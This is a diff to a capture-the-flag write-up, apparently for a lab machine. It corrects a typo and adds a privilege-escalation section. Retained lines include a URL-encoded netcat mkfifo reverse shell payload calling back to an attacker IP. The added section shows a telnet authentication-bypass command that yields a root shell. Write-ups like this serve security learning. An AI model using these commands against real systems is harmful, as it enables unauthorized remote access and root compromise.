@@ -147,7 +147,7 @@ Content-Length: 235
 
 ---
 
-Now taht we know we have RCE, lets go ahead and get a reverse shell onto the system by cmd injecting a nc reverse shell into the URL.
+Now that we know we have RCE, lets go ahead and get a reverse shell onto the system by cmd injecting a nc reverse shell into the URL.
 
 I URL encoded an nc mkfifo commadn including all special chars which gave me ```rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E16%2E15%201337%20%3E%2Ftmp%2Ff```.
 
@@ -184,13 +184,29 @@ I tried the new creds via ssh and Succcess! What a score privileged ssh session.
 
 <img width="406" height="51" alt="image" src="https://github.com/user-attachments/assets/f5dba00e-a2e0-400b-b9c4-418a8bd259fb" />
 
-
-
-<img width="960" height="708" alt="image" src="https://github.com/user-attachments/assets/ea012ddf-c309-4ac6-9a2f-e29b05e1cf5c" />
-
-
+---
 
 ## Priv Esc
+
+Enumerating around, I found no SUID binaries and my user could not run sudo, so the low hanging fruit were out of the question.
+
+I then ran ```linpeas.sh``` because I was stuck and couldn't think of anything to do, and thats when i noticed that there was something being served on local host on ```port 23```.
+
+I tried to see if telnet was installed on the machine by running ```telnet --version``` and found out that telnet was indeed on the machine running version 2.7.
+
+I tried getting atelnet session with adam's credentials, but it was the same as ssh so nothing gained there.
+
+I then decided to look up the telnet version and found that it was vulnerable and even was assigned ```CVE-2026-24061```.
+
+I took a look at [OffSec's Deep Dive](https://www.offsec.com/blog/cve-2026-24061/) on the vulnerability and found that if you did the command ```USER='-f root' telnet -a <ipaddr>```, you would get a root shell.
+
+The reason this happens is that since in this version of telnet, authentication was delegated to ```/usr/bin/login``` and this binary would log the user in with teh username found in the ```USER``` environment variable.
+
+So, by setting the ```USER``` environment variable to ```root -f``` it is telling telnet to log the user in as root and ```-f``` tells it to skip authentication entirely. The built out command would be ```/usr/bin/login -h [hostname] “-f root”```.
+
+So, by following the instructions from OffSec and entering ```USER='-f root' telnet -a <ipaddr>```, I now have a root shell and the root flag. Success! ☆*: .｡. o(≧▽≦)o .｡.:*☆
+
+<img width="960" height="708" alt="image" src="https://github.com/user-attachments/assets/ea012ddf-c309-4ac6-9a2f-e29b05e1cf5c" />
 
 
 ## Solution Steps
